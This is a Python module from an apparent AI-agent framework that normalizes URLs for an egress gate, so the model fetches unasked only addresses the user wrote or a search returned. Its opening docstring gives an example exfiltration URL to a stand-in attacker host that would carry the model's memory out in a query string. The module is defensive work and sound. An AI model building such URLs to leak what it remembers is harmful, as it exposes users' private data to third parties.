"""Addresses as the egress gate compares them: one spelling per address.

A page read unasked is a request to whoever the URL names, and the URL itself carries
whatever the model put in it: `https://attacker.example/?d=<what you remember>` sends
her memory out in the asking. So a page is read without asking only at an address the
user wrote or a search returned (`kernel/egress.py`). Matching is on the whole address,
as `httpx` will request it, never on its words: `/?d=x` and `/d/x` are different
requests, and a known address with something added is an unknown one.
"""

from __future__ import annotations

import re
from collections.abc import Iterable

import httpx

# An address as people paste it: up to the first space, quote or angle bracket.
_FOUND = re.compile(r"https?://[^\s<>\"'`]+", re.IGNORECASE)
# And as people type it, without a scheme ("bbc.co.uk/news"): a host of dotted labels
# ending in letters, and perhaps a port and a path. Not straight after "@", ".", "/" or
# a word character, so neither an email address nor the middle of an address counts.
_BARE = re.compile(
    r"(?<![\w@/.:-])(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}"
    r"(?::\d{1,5})?(?:/[^\s<>\"'`]*)?",
    re.IGNORECASE,
)
# Punctuation that ends the sentence an address sat in, rather than the address.
_TRAILING = ".,;:!?)]}'\""
_DEFAULT_PORTS = {"http": 80, "https": 443}


def normalize_url(text: str) -> str | None:
    """`text` as the request it makes: scheme and host as `httpx` resolves them (an
    international host in punycode), the port only when it isn't the scheme's, the path
    and query as sent, and no fragment, which never leaves the browser. Credentials stay
    in, so an address can't borrow a known one's standing by hiding data before `@`.
    None for anything that isn't an http(s) address with a host."""
    try:
        url = httpx.URL(text.strip())
    except (httpx.InvalidURL, TypeError, ValueError):
        return None
    if url.scheme not in _DEFAULT_PORTS or not url.raw_host:
        return None
    host = url.raw_host.decode("ascii", "replace")
    if ":" in host:  # an IPv6 literal
        host = f"[{host}]"
    if url.port is not None and url.port != _DEFAULT_PORTS[url.scheme]:
        host = f"{host}:{url.port}"
    userinfo = url.userinfo.decode("ascii", "replace")
    if userinfo:
        host = f"{userinfo}@{host}"
    target = url.raw_path.decode("ascii", "replace") or "/"
    return f"{url.scheme}://{host}{target}"


def urls_in(texts: Iterable[str]) -> frozenset[str]:
    """Every address written in `texts`, normalised; one written without a scheme as
    both an http and an https address, since either may be the one read."""
    found: list[str] = []
    for text in texts:
        found += (_trimmed(match) for match in _FOUND.findall(text))
        for match in _BARE.findall(text):
            found += (f"https://{_trimmed(match)}", f"http://{_trimmed(match)}")
    return normalized(found)


def _trimmed(found: str) -> str:
    """An address without the punctuation of the sentence it sat in. A closing bracket
    belongs to it when it closes one of its own: `…/wiki/Python_(language)`."""
    while found and found[-1] in _TRAILING:
        if found[-1] == ")" and found.count("(") >= found.count(")"):
            break
        found = found[:-1]
    return found


def normalized(urls: Iterable[str]) -> frozenset[str]:
    """`urls`, each normalised; what isn't an address is left out."""
    return frozenset(url for url in map(normalize_url, urls) if url is not None)
